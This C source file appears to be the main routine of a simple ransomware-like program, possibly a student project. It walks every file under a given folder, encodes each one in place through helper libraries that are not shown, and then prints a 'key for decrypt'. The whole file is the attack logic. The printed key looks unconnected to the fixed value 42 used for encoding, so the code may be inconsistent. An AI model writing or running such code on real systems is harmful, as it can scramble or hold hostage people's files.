#include <stdlib.h>
#include <stdio.h>
#include <dirent.h>
#include <string.h>
#include <sys/stat.h>
#include <limits.h>
#ifndef PATH_MAX
#define PATH_MAX 4096 
#endif
#include "include/liblinuxreadarbo.h"
#include "include/liblinuxencode.h"

int main(int argc, char *argv[]) {
    char *parentFolder;

    if (argc <= 1) {
        printf("Usage: %s <chemin_dossier_parent>\n", argv[0]);
        exit(1);
    }
    
    parentFolder = argv[1];
    
    char absolutePath[PATH_MAX];
    if (realpath(parentFolder, absolutePath) == NULL) {
        perror("Erreur lors de la conversion du chemin relatif en chemin absolu");
        exit(1);
    }

    char **allfiles = listFilesfromDirectories(absolutePath);
    for (int i = 0; allfiles != NULL && allfiles[i] != NULL; ++i) {
        FILE *file = fopen(allfiles[i], "r+");
        encodeFile(file, 42);
        free(allfiles[i]); 
    }
    char *key = get_key(15);
    printf("key for decrypt : %s", key);

    return 0;
}

